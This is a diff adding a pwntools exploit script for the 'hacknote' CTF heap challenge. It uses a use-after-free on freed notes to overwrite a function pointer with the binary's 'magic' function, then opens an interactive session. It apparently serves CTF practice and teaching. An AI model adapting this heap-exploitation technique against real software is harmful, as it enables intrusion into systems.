@@ -1,0 +1,33 @@
+from pwn import *
+context(arch = 'amd64',os = 'linux',log_level = 'debug')
+io = process('./hacknote')
+#gdb.attach(io,"b *0x08048A75")
+elf = ELF("./hacknote")
+#io=remote("challenge.example.invalid", 9999, ssl=True, sni="challenge.example.invalid")
+def add(size,payload):
+    io.recvuntil(b"Your choice :")
+    io.send(b'1')
+    io.recvuntil(b"Note size :")
+    io.send(str(size).encode())
+    io.recvuntil(b"Content :")
+    io.send(payload)
+def delete(index):
+    io.recvuntil(b"Your choice :")
+    io.send(b'2')
+    io.recvuntil(b"Index :")
+    io.send(str(index).encode())
+def print(index):
+    io.recvuntil(b"Your choice :")
+    io.send(b'3')
+    io.recvuntil(b"Index :")
+    io.send(str(index).encode())
+magic = elf.symbols["magic"]
+add(0x8,b'aaa')
+add(0x18,b'aaa')
+#add(0x18,b'aaa')
+delete(0)
+delete(1)
+payload = p32(magic)
+add(0x8,payload)
+print(0)
+io.interactive()
